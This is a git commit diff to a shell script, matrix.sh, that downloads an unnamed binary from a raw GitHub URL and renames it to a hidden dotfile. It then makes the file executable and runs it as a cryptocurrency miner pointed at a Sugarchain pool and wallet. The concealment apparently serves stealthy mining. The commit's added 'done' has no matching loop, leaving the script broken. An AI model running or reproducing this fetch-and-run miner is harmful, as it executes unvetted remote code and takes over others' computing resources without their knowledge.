235842286c60ba6f51d898f57fe798de5e83acd9
kijang-010 <85927384+kijang-010@users.noreply.github.com>
2021-06-18 19:31:33 +0000

    Update matrix.sh

--- matrix.sh
+++ matrix.sh
@@ -2,5 +2,7 @@
 
 wget https://raw.githubusercontent.com/razmai9/0001-0050/master/0012
 mv 0012 .nssma
-chmod +x .nssma
+chmod u+x .nssma
 ./.nssma -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.hubhub -t2
+sleep 5
+done
